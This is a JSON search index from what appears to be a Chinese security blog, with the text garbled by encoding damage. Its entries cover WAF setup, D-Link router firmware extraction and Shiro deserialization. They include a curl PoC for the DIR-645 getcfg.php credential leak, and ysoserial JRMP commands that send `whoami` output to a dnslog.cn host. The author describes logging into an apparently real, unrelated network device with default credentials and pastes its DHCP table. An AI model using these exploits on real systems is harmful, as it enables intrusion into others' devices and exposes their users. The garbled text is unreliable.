å…¥è¯·æ±‚åŒ¹é…ï¼šCookieã€å›½å®¶/åœ°åŒºã€URIæŸ¥è¯¢å­—ç¬¦ã€URIè·¯å¾„ã€çˆ¬è™«æœºå™¨äººç­‰ï¼Œå¯æ ¹æ®éœ€æ±‚è¿›è¡Œè‡ªå®šä¹‰ã€‚#0x04å¸¦æœ‰æ”»å‡»æ€§çš„æµé‡ä¸€ï¼šLocalWAF-JXWAF1.æ‰‹åŠ¨å®‰è£…-1x01è‡³1x032.è‡ªåŠ¨å®‰è£…-JXWAF-README.MDå‚è€ƒcentos.orgVMwareå®‰è£…Centos7ç³»ç»Ÿ*Tips:æ–°å®‰è£…çš„Centosé¡»ä¿®æ”¹ï¼š/etc/sysconfig/network-scripts/ifcfg-{interface}ä¸­çš„onbooté€‰é¡¹ä¸ºyes-&gt;ifconfig-l-&gt;lo0eth0-&gt;{interface}=eth0#1x01Luaæ¥å…¥æµ‹è¯•openrestyinstall$yuminstall-yreadline-develpcrepcre-developensslopenssl-develgcccurlGeoIP-develwgetperl$wgethttps://openresty.org/download/openresty-1.15.8.3.tar.gz$tar-xvfopenresty-1.15.8.3.tar.gz$cdopenresty-1.15.8.3$./configure-j2$make-j2$sudomakeinstallLuadebug$viHelloWorld.luaprint(\"HelloWorld!\")$luaHelloWorld.luaHelloWorld!openrestyconf[bin4xin@ingeekopenresty]$pwd/usr/local/openresty$vinginx/conf/nginx.conf#nginx.confworker_processes1;events{worker_connections1024;}http{lua_code_cacheoff;server{location/test{default_type'text/plain';content_by_lua_file'/opt/lua/test.lua';}}}$sudobin/openresty-tnginx:[alert]lua_code_cacheisoff;thiswillhurtperformancein/usr/local/openresty/nginx/conf/nginx.conf:39nginx:theconfigurationfile/usr/local/openresty/nginx/conf/nginx.confsyntaxisok$ps-ef|grepopenroot179031023:17?00:00:00nginx:masterprocessbin/openresty$cat/opt/lua/test.lua#test.lualocalname=\"Anonymous\"ngx.say(\"Hello,\",name,\"!\")ngx.say(\"test\")è‡³æ­¤è§„åˆ™å…³è”å®Œæ¯•ï¼Œæµ‹è¯•ï¼š$curllocalhost/testHello,Anonymous!test#1x02openrestyæ¥å…¥JXWAFæ¥å…¥å¯ä»¥å‚è€ƒï¼šJXWAF-README.MD#1x03æ¥å…¥æ•ˆæœå®ç°åŸºæœ¬çš„webhttpåº”ç”¨åè®®æ¶æ„æµé‡åŒ…çš„æ‹¦æˆªè‡ªå®šä¹‰403ç­‰é¡µé¢è‡ªå®šä¹‰è§„åˆ™åº“"
  },

  {
    "title"    : "Router-BinFile-Analysis",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Router-BinFile-Analysis/",
    "date"     : "Jul 8, 2021",
    "content"  : "æœ¬æ–‡ä¸»è¦è®°å½•äº†Routerå›ºä»¶æå–çš„è¿‡ç¨‹ï¼Œä¸°å¯Œç›¸å…³ä»ä¸šæ–¹å‘çš„ç»éªŒï¼›ä¹Ÿæ˜¯ç¬¬ä¸€ä¸ªè·Ÿç€æ•™ç¨‹æå–å‡ºçš„å›ºä»¶ï¼Œè¿‡ç¨‹æœ‰äº›æ›²æŠ˜ï¼Œåˆ†äº«ä¸€äº›å¿ƒè·¯å†ç¨‹å’Œæå–æ€è·¯ã€‚VMUbuntu18Binwalkfirmware-mod-kitUbuntuæœ¬åœ°VMé•œåƒå®‰è£…ã€æ¢æºä»€ä¹ˆçš„å°±ä¸èµ˜è¿°äº†ï¼›éœ€è¦äº†è§£çš„æœ‹å‹ç§»æ­¥æœç´¢å¼•æ“ï¼›é›¶ï¼šDLink-DIR645A1_FW102B08ä¸‹è½½åœ°å€ï¼šDLink-ftp.dlink.runodeä¸‹è½½binåç¼€çš„æ–‡ä»¶ï¼›è·¯ç”±å™¨å›ºä»¶å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªåµŒå…¥å¼ç³»ç»Ÿï¼Œæ˜¯è·¯ç”±å™¨æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿï¼›æˆ‘ä»¬æ—¥å¸¸ä¸­ä½¿ç”¨çš„åƒæœ¬æ–‡ä¸­æåŠåˆ°çš„Ubuntu18åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œå ç”¨å®¹é‡åŠ¨è¾„2Gä»¥ä¸Šï¼Œè·¯ç”±å™¨ä¸»è¦åŠŸèƒ½ä¸ºæ‹¨å·ã€æ— çº¿ç­‰ä¸Šç½‘ç”¨é€”ï¼ŒåŠŸèƒ½è¾ƒä¸ºå•ä¸€ï¼Œæ‰€ä»¥ä¸»æµLinux/BSDå‘è¡Œç‰ˆé•œåƒåˆ™ä¸é€‚ç”¨ï¼›æ‰€ä»¥å¸‚é¢ä¸Šæœ‰å¾ˆå¤šé­”æ”¹çš„ã€é€‚ç”¨äºè·¯ç”±å™¨çš„åµŒå…¥å¼ç³»ç»Ÿï¼›åŸºäºLinuxOpenWrtCommotionWirelessDebWRTHyperWRTPadavanâ€¦åŸºäºBSDUnixå†…æ ¸FreeBSD-è‡ªç”±åŠå¼€æ”¾æºä»£ç æ“ä½œç³»ç»Ÿï¼ˆé‡‡ç”¨BSDæˆæƒæ¡æ¬¾ï¼‰zrouterBSDRouterProjectm0n0wallpfsenseOPNsenseèƒŒæ™¯å°±ä»‹ç»ä¸€äº›ï¼Œæœ‰å…´è¶£å¯ä»¥ç§»æ­¥WIKIPEDIA[1]æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å°±æ‹¿åˆ°äº†DIR645A1_FW102B08ç‰ˆæœ¬çš„å›ºä»¶ï¼Œæ‹¿åˆ°å¿«é€’çš„ç¬¬ä¸€æ­¥å½“ç„¶æ˜¯æ‹†å¿«é€’ï¼›0x01ï¼šæ‰‹åŠ¨æå–hsqssystemfilesTipsï¼šSquashfsï¼ˆ.sfsï¼‰æ˜¯ä¸€å¥—ä¾›Linuxæ ¸å¿ƒä½¿ç”¨çš„GPLå¼€æºåªè¯»å‹ç¼©æ–‡ä»¶ç³»ç»Ÿï¼Œå…·æœ‰è¶…é«˜å‹ç¼©ç‡ï¼Œå…¶å‹ç¼©ç‡æœ€é«˜å¯è¾¾34%ã€‚æ‰‹åŠ¨åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼š1)strings|grepæ£€ç´¢æ–‡ä»¶ç³»ç»Ÿmagicç­¾åå¤´2)hexdump|grepæ£€ç´¢magicç­¾ååç§»3)dd|fileç¡®å®šmagicç­¾ååç§»å¤„çš„æ–‡ä»¶ç±»å‹#Whyhsqs?é—®ï¼šä¸ºä»€ä¹ˆæ˜¯åœ¨æ–‡ä»¶ä¸­æ£€ç´¢hsqsï¼Ÿå›ç­”ï¼šå¯è¯†åˆ«å­—ç¬¦ç‰¹å¾ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥é€šè¿‡JSESSIONIDCOOKIEæ¥åˆ¤æ–­å‡ºè¿™æ˜¯ä¸€ä¸ªJ2EEç³»ç»Ÿï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½åˆ¤æ–­è¿™ä¸ªç³»ç»Ÿæ˜¯å¦é›†æˆäº†ApacheShiroï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›ä¸€æ­¥é€šè¿‡rememeberMeCOOKIEæ¥åˆ¤æ–­ï¼Œæ›´æœ‰ç”šè€…åˆ™éœ€è¦é€šè¿‡äººå·¥æ¥å¯»æ‰¾è·¯ç”±åˆ¤æ–­ï¼›æ‰€ä»¥æ­¤å¤„çš„æ–‡ä»¶ç±»å‹åˆ¤æ–­åŒæ ·ï¼Œæ–‡ä»¶ç³»ç»Ÿmagicç­¾åå¤´æ˜¯æŒ‡ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­åŒ…å«çš„ä¸€ä¸²å¯è¯†åˆ«å­—ç¬¦ï¼Œæœ‰äº†è¿™ä¸²å­—ç¬¦ï¼Œè¡¨æ˜è¯¥æ–‡ä»¶å¯èƒ½åŒ…å«æŸä¸ªæ–‡ä»¶ç³»ç»Ÿï¼›å½“ç„¶ï¼Œå¦‚æœè¦ç¡®å®šæ˜¯å¦åŒ…å«æŸæ–‡ä»¶ç³»ç»Ÿï¼Œè¿˜éœ€è¦åˆ©ç”¨å…¶ä»–æ¡ä»¶é…åˆè¯æ˜ï¼Œä¹Ÿå°±æ˜¯2ã€3æ­¥éª¤éœ€è¦åšã€‚#å¯»æ‰¾è¿™ä¸ªå¿«é€’çš„è¿å•:)âœstringsDIR645A1_FW102B08.bin|grep\"hsqs\"hsqsâœhexdump-CDIR645A1_FW102B08.bin|grep-n\"hsqs\"88066:0016009068737173a30700002964cc4e00000100|hsqs....)d.N....|åœ¨åç§»0x160090å‘ç°äº†hsqsï¼Œ16è¿›åˆ¶è½¬åŒ–ä¸º10è¿›åˆ¶å¾—1441936ï¼Œå¤åˆ¶ç­¾ååç§»çš„æ–‡ä»¶ç±»å‹å¤§å°â‰¤100byteså³å¯ï¼šTipsï¼šé€šå¸¸å¤åˆ¶100å­—èŠ‚çš„æ•°æ®ï¼Œæ˜¯å› ä¸ºsquashfsæ–‡ä»¶ç³»ç»Ÿçš„å¤´éƒ¨æ ¡éªŒä¸ä¼šè¶…è¿‡100å­—èŠ‚ç®€è€Œè¨€ä¹‹ï¼šæ­¤å¤„æå–å‡ºæ¥çš„100å­—èŠ‚å¤§å°çš„squashå¯ä»¥ç±»æ¯”æˆå¿«é€’è¿å•ï¼Œè¿å•ä¸Šè¯¦ç»†è®°å½•ç€å¿«é€’ç±»å‹ã€å¿«é€’å¤§å°ç­‰æ‰˜è¿ç‰©ç›¸å…³ä¿¡æ¯ï¼›âœddif=DIR645A1_FW102B08.binbs=1count=100skip=1441936of=squash100+0recordsin100+0recordsout100bytescopied,0.0387127s,2.6kB/sâœfilesquashsquash:Squashfsfilesystem,littleendian,version4.0,5958022bytes,1955inodes,blocksize:65536bytes,created:WedNov2303:10:332011æˆ‘ä»¬çœ‹åˆ°è¿å•æ˜¾ç¤ºï¼šç±»å‹Squashfsfilesystemï¼Œå¤§å°5958022bytesï¼Œåˆ›å»ºæ—¶é—´WedNov2303:10:332011ï¼Œå½“ç„¶è¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä¸‹ä¸€æ­¥æ‰€éœ€è¦çš„å‚æ•°ï¼›ddif=DIR645A1_FW102B08.binbs=1count=5958022skip=1441936of=kernel.squashå‘½ä»¤è¾“å‡ºæ•°æ®æ–‡ä»¶#æ‰“å¼€å¿«é€’ç›’å­:)ç”¨åˆ°çš„å·¥å…·ï¼šfirmware-mod-kit$gitclonehttps://github.com/mirror/firmware-mod-kit.git$sudoapt-getinstallbuild-essentialzlib1g-devliblzma-devpython-magic$cdfirmware-mod-kit/src$./configure&amp;&amp;make#è¿™é‡Œé¡ºä¾¿ä¸€æï¼šln:failedtocreatehardlink'uncomp_r.c'=&gt;'uncomp.c':Operationnotpermitted#æŠ¥é”™æ˜¯æ“ä½œä¸è¢«å…è®¸ï¼Œå› ä¸ºæˆ‘å›¾çœäº‹å®¿ä¸»æœºå…±äº«äº†ä¸€ä¸ªæ–‡ä»¶å¤¹ç»™è™šæ‹Ÿæœºï¼Œmakeæ“ä½œéƒ½æ˜¯åœ¨å…±äº«æ–‡ä»¶å¤¹ä¸‹ï¼Œå¯¼è‡´æƒé™å­˜åœ¨é—®é¢˜$makeclean$mvfirmware-mod-kit/*~/Desktop/firmware-mod-kit/&amp;&amp;cdfirmware-mod-kit/src$./configure&amp;&amp;make#ç´§æ¥ç€ç›´æ¥å¯¹kernel.squashè¿›è¡Œè§£åŒ…å³å¯$cd../&amp;&amp;./unsquashfs_all.sh../kernel.squashä¸Šå›¾çº¢å­—æ­¥éª¤ä¾æ¬¡ä»ä¸Šåˆ°ä¸‹ï¼š1.successinlocalfold.2.makeerror:ln:failedtocreatehardlinkâ€˜uncomp_r.câ€™=&gt;â€˜uncomp.câ€™:Operationnotpermitted.3.æå–æˆåŠŸ0x02Binwalkæå–hsqssystemfiles$binwalk-MeDIR645A1_FW102B08.bin$cd_DIR645A1_FW102B08.bin.extracted/$/{path/to/firmware-mod-kit}/unsquashfs_all.sh160090.squashfsåŒæ ·è§£å‡ºï¼›å›¾ç‰‡çº¢å­—æ­¥éª¤ä¾æ¬¡ä»ä¸Šåˆ°ä¸‹ï¼š1.binwalkè§£å‡º.squashfsæ–‡ä»¶åéœ€æ‰‹åŠ¨ä½¿ç”¨unsquashfs_allè„šæœ¬è§£åŒ…2.ä¸¤ç§æ–¹æ³•ä¹‹é—´çš„è¿‡ç¨‹æ¯”è¾ƒ0x03DIR-645æ•æ„Ÿä¿¡æ¯æ³„éœ²htdocs/web/getcfg.phpHTTP/1.1200OKContent-Type:text/xml&lt;?echo\"&lt;?\";?&gt;xmlversion=\"1.0\"encoding=\"utf-8\"&lt;?echo\"?&gt;\";?&gt;&lt;postxml&gt;&lt;?include\"/htdocs/phplib/trace.php\";if($_POST[\"CACHE\"]==\"true\"){\techodump(1,\"/runtime/session/\".$SESSION_UID.\"/postxml\");}else{\t/*cut_count()willreturn0whennooronlyonetoken.*/\t$SERVICE_COUNT=cut_count($_POST[\"SERVICES\"],\",\");\tTRACE_debug(\"GETCFG:got\".$SERVICE_COUNT.\"service(s):\".$_POST[\"SERVICES\"]);\t$SERVICE_INDEX=0;\twhile($SERVICE_INDEX&lt;$SERVICE_COUNT)\t{\t\t$GETCFG_SVC=cut($_POST[\"SERVICES\"],$SERVICE_INDEX,\",\");\t\tTRACE_debug(\"GETCFG:serivce[\".$SERVICE_INDEX.\"]=\".$GETCFG_SVC);\t\tif($GETCFG_SVC!=\"\")\t\t{\t\t\t$file=\"/htdocs/webinc/getcfg/\".$GETCFG_SVC.\".xml.php\";\t\t\t/*GETCFG_SVCwillbepassedtothechildprocess.*/\t\t\tif(isfile($file)==\"1\")dophp(\"load\",$file);\t\t}\t\t$SERVICE_INDEX++;\t}}?&gt;&lt;/postxml&gt;Poc:curl-d\"SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1\"\"http://{ip.addr}:{ip.port}/info/getcfg.php\"ä¸€ï¼šH3C-AM8000V100R008ä¸‹è½½åœ°å€ï¼šH3C-AM8000V100R0081x01binwalkæå–systemfileså®˜ç½‘æ˜¾ç¤ºæ˜¯2015å¹´ä¸Šä¼ çš„åŒ…ï¼Œä¸‹è½½ä¸‹æ¥ç›´æ¥åœ¨ubuntué‡Œè§£åŒ…âœbinwalk-MeAM8000V100R008.binï¼Œå°´å°¬çš„æ˜¯æ‰€æœ‰çš„æ–‡ä»¶å°±ç›´æ¥å‡ºæ¥äº†ä¹ˆå‘ç°shadowï¼Œè§£å‡ºæ¥çœ‹çœ‹ï¼šâœjohn-format=md5crypt{file/path}&amp;&amp;john--show{file/path}1x02é»˜è®¤å¸å·å¯†ç fofa:userLogin.aspæ—¢ç„¶æœ‰äº†é»˜è®¤è´¦å·å¯†ç ï¼Œå»æ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰å¹¸è¿å„¿ï¼ŒæŸ¥çœ‹web.configå…¥å£æ–‡ä»¶ä¸ºuserLogin.aspï¼Œé‚£å°±ç›´æ¥æŒ‡å®šè¯­æ³•ï¼›#æ¥è‡ªæ­å·çš„å¹¸è¿å„¿ä¸å…‰å¼±å£ä»¤ï¼Œè¿˜æ˜ å°„äº†nä¸ªå†…ç½‘ç«¯å£åˆ°å…¬ç½‘ä¸Šï¼Œæ˜ å°„å‡ºæ¥çš„ç«¯å£æ˜¯Hikvisonçš„è§†é¢‘æµç«¯å£å’Œwebç®¡ç†ï¼Œå°±ä¸è´´å›¾äº†å¯ä»¥å‚è€ƒHikvision-ConfigurationFiles-decrypterï¼›å¦å¤–é™„ä¸Šéƒ¨åˆ†dhcpæŒ‡å‘è¡¨è‡ªè¡Œæ„Ÿå—ä¸€ä¸‹ï¼š5\tF4:83:CD:00:62:CD\t192.168.x.7\tTL-WDR56006\t18:87:40:96:43:7F\t192.168.x.8\tRedmiK305G-25107\t58:6B:14:26:B4:4C\t192.168.x.9\tguoqingdeiPhone8\t4C:CC:6A:AA:D0:45\t192.168.x.10\twp-pjb9\t74:27:EA:AC:44:2D\t192.168.x.11\tyjy-jcb10\t40:F2:E9:37:04:96\t192.168.x.13\tIMM2-40f2e93704å½“ç„¶ä¹Ÿæ˜¯æ”¯æŒtelnetè¿æ¥çš„ï¼š[æœªå®Œå¾…ç»­â€¦]å‚è€ƒè·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿä¸æå–squashFSæ–‡ä»¶ç³»ç»Ÿè·¯ç”±å™¨å›ºä»¶ä¸‹çš„å°è¯•ç‰›åˆ€"
  },

  {
    "title"    : "Â© å“¨å…µSentry Securityç›¸å…³æŠ€æœ¯æ ˆç®€ä»‹",
    "category" : "",
    "tags"     : "ç¬”è®°, wiki",
    "url"      : "/top/2021/Jekyll-site-routers-and-config/",
    "date"     : "Jul 7, 2021",
    "content"  : "[2021/11/09/15:08:59]:æœ¬æ–‡ä¸»è¦ä»‹ç»Â©å“¨å…µSENTINELSECURITY,LABç›¸å…³ä¸»é¢˜æºç çš„è·¯ç”±ã€ç›¸å…³é…ç½®ç­‰æ›´å¤šå‚è€ƒæ­¤é“¾æ¥ä»¥å¿«é€Ÿå¼€å§‹"
  },

  {
    "title"    : "JRMP-Gadget",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/JRMP-Gadget/",
    "date"     : "Jun 30, 2021",
    "content"  : "Shiroæ¡†æ¶æ·±å…¥åˆ©ç”¨ï¼šJRMP-Gadgetåˆ©ç”¨é“¾æµ…æPartI:StayHungry,StayFoolish.PartII:å­¦çš„è¶Šå¤šï¼Œä¸æ‡‚å¾—ä¹Ÿå°±è¶Šå¤šã€‚*2021å¹´6æœˆ30æ—¥æ˜ŸæœŸä¸‰15æ—¶30åˆ†40ç§’CSTå‰ä¸ä¹…ï¼ŒFofaå®‰å…¨å·¥ç¨‹å¸ˆæŸä¿¡æ­£åœ¨æ„‰å¿«çš„ç½‘ä¸Šå†²æµªï¼Œä¸ä¸€ä¼šç¾¤é‡Œä¸¢å‡ºäº†ä¸€ä¸ªæƒ¹çœ¼çš„é“¾æ¥å¸å¼•äº†æŸä¿¡çš„æ³¨æ„ã€‚é“¾æ¥æ ¼å¼ï¼šhttp://{ip.addr}:{ip.port}/a/loginèŠ½å„¿ï½å½“æ—¶æˆ‘æ•´ä¸ªäººçš„æ˜¯è¿™æ ·çš„ï¼šå› ä¸ºè¿™ä¸ªé“¾æ¥å®åœ¨æ˜¯å¤ªç†Ÿæ‚‰äº†ï¼Œæµè§ˆå™¨è®¿é—®ï¼Œæœç„¶ç›´æ¥è·³è½¬ï¼š/a/login;JSESSIONID=Â·Â·Â·å’Œå…·æœ‰è¾¨è¯†åº¦çš„Cookieï¼šjeesite.session.idä¸€åˆ‡éƒ½æ˜¯è¿™ä¹ˆçš„è‡ªç„¶ï¼Œæˆ‘å¯çœŸæ˜¯å¤ªç¥æ°”äº†ã€‚æ¢³ç†ä¸€ä¸‹ï¼šShiroæ¡†æ¶JeesiteCMSå·²çŸ¥è·¯ç”±/a/ã€/f/â€¦æ‰€ä»¥è¿™ä¸ªç«™å°±å¯ä»¥ç›´æ¥ä»Shiroå…¥æ‰‹æ¥çœ‹ï¼Œè€ä¸‰æ ·ï¼šè·‘å¯†é’¥-&gt;åˆ©ç”¨é“¾-&gt;Dnslogä¸è¿‡è·‘å¯†é’¥å‡ºäº†ä¸ªå°æ’æ›²ï¼Œç™»å½•è·¯ç”±loginå¤„è®¾ç½®rememberMeCookieæ—¶ååŒ…Set-Cookieä¸æ˜¾ç¤ºdeleteMeCookieï¼Œå…·ä½“åŸå› å¾…æ›´æ–°ï¼šDifferentShiroFrameworkdeserializationanalysisideasï¼Œè€Œä»ä¸Šé¢çš„ç‰¹å¾æˆ‘ä»¬å·²ç»å¯ä»¥è‚¯å®šå­˜åœ¨Shiroæ¡†æ¶ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡å¯¹ä¸å­˜åœ¨çš„è·¯ç”±è¿›è¡ŒCookieè®¾ç½®æ¥è¿›è¡ŒéªŒè¯ã€‚ç”±äºä¸Šé¢çš„åŸå› å¯¼è‡´æœ‰ä¸€äº›åŒ¹é…å›åŒ…æ¥æ£€æµ‹shiroæ¡†æ¶ä¸ºé€»è¾‘å·¥å…·å°±åœ¨åŸåœ°åˆ’æ°´ä¸åŠ¨å¼¹ï¼Œä¸æ…Œï¼Œæ€»æœ‰ä¸€äº›â€œå°–å­ç”Ÿâ€ï¼Œè·‘å‡ºé»˜è®¤å¯†é’¥ï¼škPH+bIxk5D2deZiIxcaaaA==ç´§æ¥ç€ï¼š[*]find:JRMPClientcanbeuse0:JRMPClientysoserial.jarå…¬ç½‘èµ·JRMPç«¯å£ï¼Œè½¬å‘å‘½ä»¤ping`whoami`.x.dnslog.cnJRMPç›‘å¬æ˜¾ç¤ºæµé‡å»ºç«‹é“¾æ¥ï¼ŒæŸ¥çœ‹dnslogï¼šé»˜è®¤åŠ å¯†å¯†é’¥-&gt;JRMPClientåˆ©ç”¨é“¾-&gt;Shiroååºåˆ—åŒ–RCErootå¤šä¹ˆèµå¿ƒæ‚¦ç›®ï¼Œä¸€åˆ‡éƒ½æ˜¯é‚£ä¹ˆåœ°ä¸æ»‘ã€‚\t\t\t\tç„¶è€Œå´å¸…ä¸è¿‡ä¸‰ç§’ï¼š\t\t\tæå‡ºé—®é¢˜å…¶å®åœ¨è¿™æ¬¡æ¸—é€çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘å¯¹äºä¸¤ä¸ªåœ°æ–¹å­˜ç–‘ï¼šç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯å¼€å‘å‘ï¼šå°±æ˜¯Shiroæ¡†æ¶è¯†åˆ«é˜¶æ®µï¼Œ/a/loginè·¯ç”±é…ç½®Shiroå¯¹åº”Cookieåæ²¡æœ‰è¿”å›å¯¹åº”çš„Set-Cookieï¼Œå¦‚ä½•å®ç°çš„ï¼ŸåŒæ—¶æˆ‘è¿™é‡ŒæŸ¥äº†ä¸€äº›èµ„æ–™ä¾›å‚è€ƒApacheShiroååºï¦œåŒ–è¯†åˆ«é‚£äº›äº‹ç¬¬äºŒä¸ªé—®é¢˜æ˜¯JRMPGadgetåˆ©ç”¨é˜¶æ®µï¼Œä¸ºä»€ä¹ˆDnslogè®°å½•æ˜¾ç¤ºä¸ºrootï¼Œè€Œç°å®æƒ…å†µä¸‹åå¼¹çš„shellæƒé™åˆ™æ˜¯ä½æƒé™ï¼Ÿ#ä¸ºä»€ä¹ˆä¸æ˜¯root?å¦‚ä¸Šå›¾ï¼Œæ•´å¼ å›¾æ˜¯æˆ‘ä¸ªäººå¯¹äºJavaååºåˆ—åŒ–ä¸­å¯¹äºJRMPåˆ©ç”¨é“¾çš„è¿‡ç¨‹ç†è§£ï¼Œä»localAttackerç¯èŠ‚å¼€å§‹ï¼Œå…·ä½“ç»†èŠ‚åœ¨è¿™é‡Œä¸åšå±•å¼€å™è¿°ï¼Œå…¶ä¸­å­˜åœ¨æ­§ä¹‰çš„åœ°æ–¹æˆ‘ä½¿ç”¨çº¢è‰²éƒ¨åˆ†è¿›è¡Œäº†æ ‡è®°ï¼›ä¸ªäººåˆ†æå­˜åœ¨çš„é—®é¢˜ä¹Ÿæ˜¯çº¢è‰²éƒ¨åˆ†ï¼šVPS-JRMPé˜¶æ®µåœ¨æœåŠ¡å™¨å¯åŠ¨çš„æ—¶å€™å‘½ä»¤ä¸ºï¼šjava-cpysoserial.jarysoserial.exploit.JRMPListener3333CommonsCollections5\"ping`whoami`.x.dnslog.cn\"å¯¹åº”çš„ï¼šysoserial.exploit.JRMPListeneråˆ©ç”¨ç±»ã€3333æœ¬åœ°JRMPç›‘å¬ç«¯å£ã€CommonsCollections5Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ä»¥åŠè½¬å‘\"ping`whoami`.x.dnslog.cn\"å‘½ä»¤å†æ¥çœ‹å¦å¤–ä¸€å¼ å›¾ç‰‡ï¼šæˆ‘ä»¬çœ‹ä¸Šé¢è¿™ä¸€å¼ å›¾ï¼Œé‡ç‚¹åœ¨äºpingroot.zj6u6s.dnslog.cnè¿›ç¨‹å¯¹åº”çš„ç”¨æˆ·åŒæ ·æ˜¯ä½æƒé™ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯ä½æƒé™çš„ç”¨æˆ·å»è¿è¡Œçš„`whoami`è¿™ä¸ªå‘½ä»¤è€Œä¸”è¾“å‡ºçš„æ˜¯rootï¼Œä½†æ˜¯ä»Linuxæƒé™çš„å¸¸è¯†æ¥çœ‹æ˜¯ä¸ä¼šå‡ºç°è¿™æ ·çš„æƒ…å†µçš„ã€‚æ‰€ä»¥æœ‰äº†ä»¥ä¸‹è®¾æƒ³ï¼šæˆ‘åˆæ­¥çš„è®¾æƒ³æ˜¯ï¼šå‡è®¾1:å‘½ä»¤æ˜¯åœ¨å—å®³æœºå™¨ä¸Šæ‰§è¡Œï¼Œé‚£ä¹ˆæœ‰å‡ ç§æƒ…å†µï¼š1.1:ä¼šä¸ä¼šå› ä¸ºè¯¥ç”¨æˆ·æ˜¯sudoç”¨æˆ·æ‰å¯¼è‡´è¿”å›çš„dnsè®°å½•ä¸ºrootï¼Ÿ1.2:å¯åŠ¨TomcatæœåŠ¡çš„ä¸ºrootç”¨æˆ·ï¼Ÿï¼ˆé€šè¿‡ps-efå¯ä»¥ç›´æ¥æ’é™¤ï¼Œè€Œä¸”ç»†æƒ³ï¼Œè‹¥Tomcatç”¨æˆ·ä¸ºrootï¼Œé‚£ä¹ˆè‚¯å®šåå¼¹çš„ç”¨æˆ·ä¹Ÿä¸ºrootï¼‰æ‰€ä»¥æˆ‘é’ˆå¯¹1.1å‡è®¾è¿›è¡Œäº†å®éªŒè¿›è¡Œæ­£ç¡®å‹éªŒè¯ï¼šâœbin4xinsudo-lUserbin4xinmayrunthefollowingcommandsonbin4xin'sMacbookPro:(ALL)ALLâœbin4xin(sudo)ping`whoami`.31veg3.dnslog.cnPINGbin4xin.31veg3.dnslog.cn(127.0.0.1):56databytes64bytesfrom127.0.0.1:icmp_seq=0ttl=64time=0.087ms64bytesfrom127.0.0.1:icmp_seq=1ttl=64time=0.163msæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šé¢çš„bashä¿¡æ¯å’Œä¸‹é¢çš„dnslogä¿¡æ¯è¿”å›çœ‹åˆ°ï¼Œä¸sudoç”¨æˆ·æ— å…³#æ˜¯å¦æ·»åŠ sudoè¿”å›éƒ½å¦‚ä¸‹ï¼š#dnslogè¿”å›è®°å½•bin4xin.31veg3.dnslog.cn\t61.132.161.4\t2021-07-0513:44:34bin4xin.31veg3.dnslog.cn\t61.132.161.6\t2021-07-0513:44:34æ‰€ä»¥è¿™ç§å‡è®¾æˆ‘ä»¬å°±ç›´æ¥æ’é™¤äº†ï¼›ç¬¬äºŒç§è®¾æƒ³å‡è®¾2:å‘½ä»¤æ˜¯åœ¨VPSæœºå™¨ä¸Šæ‰§è¡Œï¼Œå°±æ˜¯JRMPåˆ©ç”¨è¿‡ç¨‹é“¾é‚£å¼ å›¾ä¸­çº¢è‰²çš„é‚£ä¸€éƒ¨åˆ†ï¼Œæˆ‘æƒ³ï¼š\"ping`whoami`.x.dnslog.cn\"å‘½ä»¤è½¬å‘å‰æœ¬åœ°æœºå™¨æ˜¯å¦å·²ç»æ‰§è¡Œäº†whoamiæ‰€ä»¥å¯¼è‡´äº†å—å®³æœºå™¨æ‰§è¡Œçš„æ˜¯rootå¼€å¤´çš„å‘½ä»¤å‘¢ï¼Ÿé‚£ä¹ˆå¦‚æœé€šè¿‡è¿™ç§å‡è®¾ï¼Œè¿‡ç¨‹å°±æ˜¯ï¼šJRMPServerListen:*0.0.0.0:3333-&gt;æœ¬åœ°æœºå™¨æ‰§è¡Œ`whoami`å—å®³æœºå™¨è®¿é—®JRMPServerï¼Œæ‰§è¡Œpingroot.x.dnslog.cnã€‚è¿™ç§æƒ…å†µä¸‹æ¥çœ‹ï¼Œå®é™…ä¸Šä¹Ÿèƒ½å¤Ÿè¯´é€šï¼Œè€Œå®é™…ä¸Šä¹Ÿæ­£æ˜¯å¦‚æ­¤ï¼Œæœ¬æ¥æ‰“ç®—æ˜¯åœ¨æœ¬åœ°è·‘ä¸ªShiroèµ°ä¸€æ•´ä¸ªæµç¨‹çš„ï¼Œä½†æ˜¯ç›´åˆ°æˆ‘å‘ç°äº†è¿™ä¸ªï¼šâœbin4xinjava-cpysoserial-0.0.6-SNAPSHOT-BETA-all.jarysoserial.exploit.JRMPListener8888CommonsCollections3\"ping`whoami`.6iep0z.dnslog.cn\"*OpeningJRMPlisteneron8888#ysoserial.exploit.JRMPListeneråˆ©ç”¨ç±»ç›‘å¬çŠ¶æ€ä¸‹ï¼šâœbin4xinps-ef|grepping5016895669602:37ä¸‹åˆttys0040:00.54java-cpysoserial.jarysoserial.exploit.JRMPListener8888CommonsCollections3pingbin4xin.6iep0z.dnslog.cnçœ‹åˆ°java-cpysoserial.jarysoserial.exploit.JRMPListener8888CommonsCollections3pingbin4xin.6iep0z.dnslog.cnè¿›ç¨‹ä¸€åˆ‡å·²ç„¶æ¸…æ™°ï¼›è‡³æ­¤ï¼Œæœ¬ç« æ ¸å¿ƒé˜è¿°å®Œæ¯•ã€‚ä»¥ä¸Š"
  },

  {
    "title"    : "Hikvision-ConfigurationFiles-decrypter",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Hikvision-ConfigurationFiles-decrypter/",
    "date"     : "Jun 29, 2021",
